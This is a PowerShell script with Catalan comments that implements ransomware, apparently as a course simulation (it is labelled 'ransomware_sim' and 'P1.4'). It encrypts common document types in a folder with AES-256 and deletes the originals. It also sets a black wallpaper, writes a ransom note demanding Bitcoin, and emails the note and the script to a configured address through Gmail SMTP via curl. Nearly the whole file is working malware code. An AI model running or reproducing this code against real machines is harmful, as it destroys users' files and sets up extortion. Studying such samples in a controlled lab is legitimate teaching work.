
param(
    [string]$Target
)

# ============================================================
# CONFIGURA AQUI ELS TEUS CREDENCIALS
$GmailUser = "exemple@exemple.com"
$GmailPass = "exemple"    # Contrasenya d'aplicacio Gmail (no la normal)
$DestEmail = "exemple@exemple.com"
# ============================================================

$Pass = "exemple"
$Ext  = ".locked"

if (-not $Target) { $Target = [Environment]::GetFolderPath('MyDocuments') }
if (-not (Test-Path -LiteralPath $Target)) {
    Write-Host "[!] La carpeta no existeix: $Target"
    exit 1
}
$Target = (Resolve-Path -LiteralPath $Target).Path

$Note        = Join-Path $Target "LLEGEIX-ME_RANSOM.log"
$RestoreInfo = Join-Path $Target "_restore_info.txt"
$ScriptPath  = $PSCommandPath

$Extensions = 'pdf','doc','docx','xls','xlsx','ppt','pptx','txt','jpg','jpeg','png','odt','csv','md','log'

# ---------- Funcio de xifrat AES-256-CBC + PBKDF2 ----------
function Protect-File {
    param([string]$Path, [string]$Password)

    $rng  = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $salt = New-Object byte[] 16
    $iv   = New-Object byte[] 16
    $rng.GetBytes($salt)
    $rng.GetBytes($iv)

    $kdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
        $Password, $salt, 100000,
        [System.Security.Cryptography.HashAlgorithmName]::SHA256)
    $key = $kdf.GetBytes(32)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $key
    $aes.IV  = $iv

    $plain  = [System.IO.File]::ReadAllBytes($Path)
    $cipher = $aes.CreateEncryptor().TransformFinalBlock($plain, 0, $plain.Length)

    $fs = [System.IO.File]::Create("$Path$Ext")
    $fs.Write([System.Text.Encoding]::ASCII.GetBytes("RNSM1"), 0, 5)   # capcalera
    $fs.Write($salt, 0, 16)
    $fs.Write($iv,   0, 16)
    $fs.Write($cipher, 0, $cipher.Length)
    $fs.Close()

    $aes.Dispose(); $kdf.Dispose(); $rng.Dispose()
}

# ---------- Fons de pantalla negre (COM IDesktopWallpaper) ----------
function Set-BlackWallpaper {
    Add-Type -AssemblyName System.Drawing

    $bmp = Join-Path $env:TEMP ("black_" + [guid]::NewGuid().ToString('N') + ".bmp")
    $img = New-Object System.Drawing.Bitmap 1920, 1080
    $g   = [System.Drawing.Graphics]::FromImage($img)
    $g.Clear([System.Drawing.Color]::Black)
    $img.Save($bmp, [System.Drawing.Imaging.ImageFormat]::Bmp)
    $g.Dispose(); $img.Dispose()

    if (-not ('DesktopWall' -as [type])) {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public struct RECT { public int Left, Top, Right, Bottom; }

[ComImport, Guid("B92B56A9-8B55-4E14-9A89-0199BBB6F93B"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface IDesktopWallpaper {
    void SetWallpaper([MarshalAs(UnmanagedType.LPWStr)] string monitorID, [MarshalAs(UnmanagedType.LPWStr)] string wallpaper);
    [return: MarshalAs(UnmanagedType.LPWStr)] string GetWallpaper([MarshalAs(UnmanagedType.LPWStr)] string monitorID);
    [return: MarshalAs(UnmanagedType.LPWStr)] string GetMonitorDevicePathAt(uint monitorIndex);
    uint GetMonitorDevicePathCount();
    void GetMonitorRECT([MarshalAs(UnmanagedType.LPWStr)] string monitorID, out RECT displayRect);
    void SetBackgroundColor(uint color);
    uint GetBackgroundColor();
    void SetPosition(int position);
    int GetPosition();
}

public class DesktopWall {
    public static IDesktopWallpaper Get() {
        var t = Type.GetTypeFromCLSID(new Guid("C2CF3110-460E-4fc1-B9D0-8A1C0C9CC4BD"));
        return (IDesktopWallpaper)Activator.CreateInstance(t);
    }
}
"@
    }

    $dw = [DesktopWall]::Get()
    $dw.SetBackgroundColor(0)          # COLORREF negre
    $dw.SetPosition(4)                 # 4 = Emplenar
    $dw.SetWallpaper($null, $bmp)      # $null = tots els monitors
    [void][Runtime.InteropServices.Marshal]::ReleaseComObject($dw)

    Start-Sleep -Milliseconds 800
    $now = (Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name Wallpaper -ErrorAction SilentlyContinue).Wallpaper
    if ($now -ne $bmp) { throw "El sistema ha revertit el valor (directiva de grup, Spotlight o sessio RDP)" }
    Write-Host "[*] BMP actiu: $bmp"
}

# ---------- 1) Xifrar els documents ----------
Write-Host "[*] Inici de la infeccio... $(Get-Date -Format 'HH:mm:ss')"

$count = 0
Get-ChildItem -LiteralPath $Target -File | Where-Object {
    $Extensions -contains $_.Extension.TrimStart('.').ToLower()
} | ForEach-Object {
    try {
        Protect-File -Path $_.FullName -Password $Pass
        Remove-Item -LiteralPath $_.FullName -Force
        $count++
    } catch {
        Write-Host "[!] No s'ha pogut xifrar $($_.Name): $($_.Exception.Message)"
    }
}

Write-Host "[*] Fitxers xifrats: $count"

# ---------- 2) Fons de pantalla negre ----------
try {
    $origWall  = (Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name Wallpaper -ErrorAction SilentlyContinue).Wallpaper
    $origStyle = (Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -ErrorAction SilentlyContinue).WallpaperStyle
    "Wallpaper=$origWall`nWallpaperStyle=$origStyle" | Set-Content -LiteralPath $RestoreInfo -Encoding UTF8

    Set-BlackWallpaper
    Write-Host "[*] Fons de pantalla canviat a negre"
} catch {
    Write-Host "[!] No s'ha pogut canviar el fons: $($_.Exception.Message)"
}

# ---------- 3) Nota de rescat ----------
$data   = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
$equip  = $env:COMPUTERNAME
$usuari = "$env:USERDOMAIN\$env:USERNAME"

@"
==============================================================
        ATAC DE RANSOMWARE - NOTA DE RESCAT
==============================================================
Data de l'atac : $data
Equip          : $equip
Usuari         : $usuari
Carpeta        : $Target
Algorisme      : AES-256-CBC + PBKDF2-SHA256 (100000 iteracions)
Extensio       : $Ext
Fitxers xifrats: $count
--------------------------------------------------------------
Cost del rescat : 1 BTC -> cartera 1R4n0mW4r3Ex4mpl3
--------------------------------------------------------------
Per desxifrar:
  .\desxifra.ps1 -Target "$Target" -Password $Pass
==============================================================
PID del proces  : $PID
Hora final      : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
==============================================================
"@ | Set-Content -LiteralPath $Note -Encoding UTF8

Get-Content -LiteralPath $Note

# ---------- 4) Enviar email amb el script adjunt (via curl.exe) ----------
try {
    $boundary = "boundary_" + [guid]::NewGuid().ToString('N')
    $eml = Join-Path $env:TEMP "mail_$boundary.eml"

    $msg = @"
From: $GmailUser
To: $DestEmail
Subject: [RANSOMWARE] Els teus fitxers han estat xifrats - P1.4
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="$boundary"

--$boundary
Content-Type: text/plain; charset=utf-8

$(Get-Content -LiteralPath $Note -Raw)

--$boundary
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="ransomware_sim.ps1"
Content-Transfer-Encoding: base64

"@
    $msg += [Convert]::ToBase64String([IO.File]::ReadAllBytes($ScriptPath), 'InsertLineBreaks')
    $msg += "`r`n--$boundary--`r`n"
    [IO.File]::WriteAllText($eml, $msg, [Text.Encoding]::UTF8)

    & curl.exe --url "smtps://smtp.gmail.com:465" --ssl-reqd `
        --mail-from $GmailUser --mail-rcpt $DestEmail `
        --user "$($GmailUser):$($GmailPass)" `
        --upload-file $eml --silent --show-error

    if ($LASTEXITCODE -eq 0) { Write-Host "[*] Email enviat a $DestEmail" }
    else { Write-Host "[!] curl ha fallat amb codi $LASTEXITCODE" }

    Remove-Item -LiteralPath $eml -Force -ErrorAction SilentlyContinue
} catch {
    Write-Host "[!] Error enviant email: $($_.Exception.Message)"
}

Write-Host ""
Write-Host "[!] PID = $PID  |  Mata'l amb: Stop-Process -Id $PID"
Write-Host "[!] NO tanquis la finestra."

# ---------- 5) Mantenir el proces viu ----------
Start-Sleep -Seconds 3600
